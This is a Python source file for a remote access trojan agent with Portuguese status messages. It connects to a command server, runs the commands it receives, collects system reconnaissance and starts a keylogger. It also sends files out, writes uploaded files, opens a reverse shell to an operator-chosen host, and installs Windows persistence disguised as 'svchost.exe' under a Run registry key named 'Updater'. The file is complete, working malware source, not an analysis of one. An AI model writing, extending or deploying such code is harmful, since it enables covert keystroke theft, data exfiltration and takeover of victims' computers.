# agent_encrypted.py
import socket, subprocess, os, platform
from cripto_utils import encrypt_data, decrypt_data, encrypt_bytes, decrypt_bytes

def connect(server='127.0.0.1', port=9999):
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((server, port))

            while True:
                encrypted = sock.recv(8192).decode()
                command = decrypt_data(encrypted)

                if command == "recon":
                    try:
                        user = os.getlogin()
                    except:
                        user = subprocess.getoutput("whoami")
                    ip = socket.gethostbyname(socket.gethostname())
                    info = {
                        "User": user,
                        "Hostname": socket.gethostname(),
                        "OS": platform.system(),
                        "Release": platform.release(),
                        "Arch": platform.machine(),
                        "IP": ip
                    }
                    try:
                        if platform.system() == "Windows":
                            info["Processes"] = subprocess.getoutput("tasklist")
                        else:
                            info["Processes"] = subprocess.getoutput("ps aux | head -10")
                    except:
                        info["Processes"] = "Erro"
                    output = "\n".join(f"{k}: {v}" for k, v in info.items())
                    sock.send(encrypt_data(output).encode())
                    continue

                elif command == "keylog_start":
                    import threading
                    from pynput import keyboard
                    def log_keys():
                        with open("keylog.txt", "a") as f:
                            def on_press(key):
                                try:
                                    f.write(f"{key.char}")
                                except:
                                    f.write(f"[{key}]")
                            with keyboard.Listener(on_press=on_press) as listener:
                                listener.join()
                    threading.Thread(target=log_keys, daemon=True).start()
                    sock.send(encrypt_data("[+] Keylogger iniciado").encode())
                    continue

                elif command.startswith("download "):
                    filepath = command.split(" ", 1)[1]
                    try:
                        with open(filepath, "rb") as f:
                            data = f.read()
                        sock.send(encrypt_bytes(data))
                    except Exception as e:
                        sock.send(encrypt_data(str(e)).encode())
                    continue

                elif command.startswith("upload "):
                    _, path, b64data = command.split(" ", 2)
                    try:
                        with open(path, "wb") as f:
                            f.write(decrypt_bytes(b64data.encode()))
                        sock.send(encrypt_data(f"[+] Arquivo salvo em {path}").encode())
                    except Exception as e:
                        sock.send(encrypt_data(f"[!] Erro: {e}").encode())
                    continue

                elif command.startswith("shell_reverse"):
                    _, ip, port = command.split()
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    try:
                        s.connect((ip, int(port)))
                        while True:
                            cmd = s.recv(1024).decode()
                            if cmd.lower() == "exit":
                                break
                            output = subprocess.getoutput(cmd)
                            s.send(output.encode())
                    except:
                        pass
                    finally:
                        s.close()
                    sock.send(encrypt_data("[+] Shell reversa encerrada").encode())
                    continue

                elif command == "persist":
                    import shutil, winreg, sys
                    dest = os.path.join(os.environ["APPDATA"], "svchost.exe")
                    shutil.copyfile(sys.executable, dest)
                    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                                         r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
                    winreg.SetValueEx(key, "Updater", 0, winreg.REG_SZ, dest)
                    sock.send(encrypt_data(f"[+] Persistência criada em {dest}").encode())
                    continue

                output = subprocess.getoutput(command)
                sock.send(encrypt_data(output).encode())
        except:
            pass

if __name__ == "__main__":
    connect()
